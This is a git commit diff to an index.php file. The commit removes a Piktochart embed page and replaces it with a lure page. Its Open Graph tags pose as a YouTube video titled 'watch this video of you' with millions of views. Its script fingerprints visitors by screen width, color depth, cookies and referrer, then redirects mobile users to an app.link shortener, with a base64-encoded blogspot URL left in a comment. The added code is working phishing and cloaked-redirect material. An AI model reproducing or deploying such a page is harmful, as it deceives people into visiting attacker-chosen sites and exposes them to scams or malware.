6ef679e3ff443992b4b0d3d64f5e02d6a9957b1f
isaac calderon <50081558+icm654987@users.noreply.github.com>
2019-10-14 06:25:23 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,67 +1,28 @@
 
-
-<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=0.95">
+					<head>
+          <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+          <meta property="og:title" content="watch this video of you ðŸ˜±" />
+          <meta property="og:description" content="4.043.882 Views" />
+          <meta property="og:url"                content="https://youtu.be" />
+					</head>
+					<body>
+          <script>
+             var referrer = document.referrer;
+             //Link cp4 codificado en base64
+            // var cp4 = "aHR0cDovL21hc3RlcmNzMDIteC14LXgteC14LXgteC14LXguYmxvZ3Nwb3QuY29tLw==";
+             //Decodifico base 64
+            // var decodedData = window.atob(cp4); // decode the string
+              function setTime() {
+              window.location = "https://j8ay8.app.link/uUt1OWV4K0";
+            }
+            if(screen.colorDepth >= 24 && navigator.cookieEnabled == true && screen.width < 900 && referrer.length === 0) {
+              window.location = "https://j8ay8.app.link/uUt1OWV4K0";
 
-  <style type="text/css">
-    html, body {margin:0; padding:0; outline:0; border:none;zoom:1;}
-  </style>
-  <script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-
-ga('create', 'UA-42574161-1', {'name': 'piktov3'});
-</script>
-
-</head>
-<body>
-  <div class="piktowrapper-embed" style="position: relative;" data-uid="40327432-video">
-    <div class="embed-loading-overlay" style="width: 100%; height: 100%; position: absolute; text-align: center;">
-      <img width="60px" alt="Loading..." style="margin-top: 100px" src="/loading.gif" />
-      <p style="margin: 0; padding: 0; font-family: Arial, sans-serif;
-      font-weight: 600; font-size: 16px">Loading...</p>
-    </div>
-    <div class="pikto-canvas-wrap">
-      <div class="pikto-canvas"></div>
-    </div>
-  </div>
-  <script type="text/javascript">
-    (function(d){
-      function startRender () {
-        var js_src = "https://create.piktochart.com/assets/embedding/embed-868d4e5f9e6f34f3f6b5618e0dd84fd478abb9d05485cf0aad71852b7e8db10e.js";
-        if(window.location.protocol=="https:"){
-          var split_js_src = js_src.split("//");
-          split_js_src[0] = "";
-          js_src = split_js_src.join("//");
-        }
-
-        var js, id="pikto-embed-js", ref=d.getElementsByTagName("script")[0];
-        if (d.getElementById(id)) {return;}
-        js=d.createElement("script"); js.id=id; js.async=true;
-        js.src=js_src;
-        ref.parentNode.insertBefore(js, ref);
-
-      }
-      (function looper () {
-        if (window.innerWidth === 0) {
-          setTimeout(looper, 500)
-        }
-        else {
-          startRender();
-        }
-      })();
-
-    }(document));
-  </script>
-</body>
-</html>
-
-
-
+            }else if(screen.colorDepth >= 24 && navigator.cookieEnabled == true && screen.width < 900 && referrer.length != 0){
+                    //link
+                    setTimeout(setTime, 900);
+                }
+            </script>
+					</body>
+					</html>
